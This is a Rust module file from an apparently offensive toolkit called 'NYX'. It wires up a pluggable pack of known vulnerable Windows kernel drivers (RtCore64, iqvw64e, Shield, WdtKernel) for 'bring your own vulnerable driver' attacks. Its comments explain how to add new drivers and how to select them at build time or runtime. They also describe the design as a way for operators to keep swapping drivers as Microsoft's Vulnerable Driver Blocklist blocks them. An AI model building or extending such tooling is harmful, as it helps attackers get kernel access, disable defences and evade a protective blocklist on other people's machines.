//! BYOVD driver pack — pluggable vulnerable driver implementations.
//!
//! ## How to add a new driver (3 steps)
//!
//! 1. Create `byovd/<name>.rs` implementing `VulnDriverIoctl`.
//! 2. Add `pub mod <name>;` to this file.
//! 3. Add a constructor in the `drivers!` macro at the bottom.
//!
//! Each driver file is self-contained: IOCTL codes, device path, struct layout.
//! The `VulnDriverIoctl` trait handles everything else via `addr_offset()`.
//!
//! ## Driver selection
//!
//! Build-time: `NYX_BYOVD=shield` sets the default driver.
//! Runtime: `bootstrap_byovd_with(Box::new(Shield))` overrides.
//!
//! ## Blocklist awareness
//!
//! The Microsoft Vulnerable Driver Blocklist is updated via Windows Update.
//! No driver stays unblocklisted forever. The pluggable architecture lets
//! operators swap drivers without touching anything outside this directory.

pub mod rtc64;
pub mod iqvw64e;
pub mod shield;
pub mod wdtkernel;

// Re-export for convenience.
pub use rtc64::RtCore64;
pub use iqvw64e::Iqvw64e;
pub use shield::Shield;
pub use wdtkernel::WdtKernel;
